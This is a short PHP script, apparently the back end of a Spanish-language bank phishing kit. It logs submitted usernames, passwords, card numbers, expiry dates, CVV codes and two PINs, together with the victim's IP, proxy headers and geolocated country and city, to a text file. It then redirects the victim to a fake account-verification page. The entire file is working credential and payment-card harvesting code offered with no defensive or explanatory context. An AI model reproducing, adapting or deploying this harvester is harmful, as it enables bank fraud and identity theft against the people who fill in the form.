


<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$ip_comp = $_SERVER['HTTP_CLIENT_IP'];
$userp = $_SERVER['HTTP_X_FORWARDED'];
$proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];


$cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));


	
	$file = fopen("NEW015.txt", "a");
	
fwrite($file, 
"* USUARIO: ".$_POST['usuario']."
* PASS: ".$_POST['pass']." 
* TARJETA: ".$_POST['tarjeta']."
* FECHA VENCIMIENTO*
* DIA: ".$_POST['month']." 
* AÑO: ".$_POST['year']."
* CVV: ".$_POST['codigo']." 
* PIN: ".$_POST['clavej']." 
* PIN1: ".$_POST['clavej2']."
* FECHA: ".date('Y-m-d')."
* HORA: ".date('H:i:s')."
* IP: ".$ip."
* PROXY: ".$proxy."
* IP COMPARTIDA: ".$ip_comp."
".$userp."
".$cc."
".$city."   
" . PHP_EOL);
fwrite($file, "==============================" . PHP_EOL);
fclose($file);

header("location:verificando-cuenta.html");

?>